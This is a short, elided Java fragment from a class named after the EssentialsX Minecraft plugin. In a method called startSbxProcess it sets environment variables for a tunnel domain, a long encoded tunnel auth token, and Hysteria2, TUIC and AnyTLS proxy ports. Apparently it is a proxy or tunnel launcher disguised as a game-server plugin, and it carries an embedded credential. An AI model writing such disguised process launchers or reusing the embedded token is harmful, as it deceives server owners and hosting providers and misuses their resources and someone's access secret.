...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("ARGO_DOMAIN", "falix1.888169.xyz");
        env.put("ARGO_AUTH", "eyJhIjoiNTgxMzZiNmVmNTNjNDAzOTYyMjc3YmUyNzM4ZDc5ZGUiLCJ0IjoiMTgzNzNiODEtZWQ3ZS00Y2ZmLWEyZjMtMDYxMGFiMDgxNjkwIiwicyI6IlkyWXpZVE0yTWpjdE1XWXpNeTAwWmpOaUxXRmtZMlF0WW1KaU1UVmpaalZrWldZdyJ9");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "22682");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
